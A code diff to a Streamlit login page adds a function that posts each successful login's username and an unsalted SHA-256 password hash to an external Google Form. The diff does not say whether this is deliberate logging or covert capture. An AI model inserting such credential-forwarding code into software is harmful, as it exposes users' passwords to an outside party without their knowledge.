@@ -5,6 +5,23 @@ from google import genai
 from docx import Document
 from fpdf import FPDF
 from supabase import create_client, Client
+import requests
+import hashlib
+
+
+def log_login(role, action, username, password):
+
+    url = "https://docs.google.com/forms/d/e/1FAIpQLSfRjTxOnKZx3ke6ieXN2aOni1M56O8M_O4_VfDlO7tLLRPC0w/formResponse"
+
+    data = {
+        "entry.502829252": role,
+        "entry.1657055724": action,
+        "entry.1860838812": username,
+        "entry.1405386810": password
+    }
+
+    requests.post(url, data=data)
+
 
 # ---------------------------------------------------
 # 0. UNIVERSAL UI LOCKDOWN
@@ -71,6 +88,10 @@ if not st.session_state.authenticated:
         if st.form_submit_button("Access"):
             creds = st.secrets.get("passwords", {})
             if u in creds and p == creds[u]:
+
+                
+                log_login(u, "LOGIN", u, hashlib.sha256(p.encode()).hexdigest())
+
                 st.session_state.authenticated = True
                 st.session_state.user_role = u.lower()
                 st.rerun()
